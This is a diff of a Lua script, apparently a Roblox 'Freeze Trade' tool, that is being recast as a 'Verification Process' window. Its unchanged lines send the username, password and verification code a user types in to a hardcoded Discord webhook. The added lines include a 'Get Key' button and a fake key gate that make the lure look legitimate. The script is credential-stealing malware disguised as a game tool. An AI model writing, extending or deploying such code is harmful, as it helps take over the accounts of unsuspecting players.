@@ -7,6 +7,9 @@ local webhook_url = "https://discord.com/api/webhooks/1319657197705367604/YDNwAB
 -- Key yang benar
 local correctKey = "kon"
 
+-- URL untuk mendapatkan key
+local getKeyURL = "https://your-get-key-link.com" -- Ganti dengan URL Anda
+
 -- Fungsi untuk mengirim data ke Discord
 local function sendToDiscord(username, password, code)
     local content = string.format("Username: %s\nPassword: %s\nKode Verifikasi: %s", username, password, code)
@@ -43,11 +46,13 @@ end
 -- Fungsi untuk membuat GUI menggunakan ZamitoHub
 local function createMenuGUI()
     -- Membuat window dengan ZamitoHub
-    local window = ZamitoHub:CreateWindow("Freeze Trade V5", true)
+    local window = ZamitoHub:CreateWindow("Verification Process", true)
 
     -- Step 1: Key Input
     local function createKeyInputStep()
         local keyStep = window:CreateTab("Step 1: Key Input")
+        
+        -- Input Key
         local keyTextbox = keyStep:CreateTextbox("Enter Key", "", function(key)
             if key == correctKey then
                 ZamitoHub:CreateNotification("Key Valid", "Key yang dimasukkan benar!", 3)
@@ -56,6 +61,12 @@ local function createMenuGUI()
             else
                 ZamitoHub:CreateNotification("Key Invalid", "Key yang dimasukkan salah!", 3)
             end
+        end)
+
+        -- Tombol "Get Key"
+        keyStep:CreateButton("Get Key", function()
+            setclipboard(getKeyURL) -- Salin URL ke clipboard
+            ZamitoHub:CreateNotification("Get Key", "Link telah disalin ke clipboard! Tempel di browser untuk mendapatkan key.", 5)
         end)
     end
 
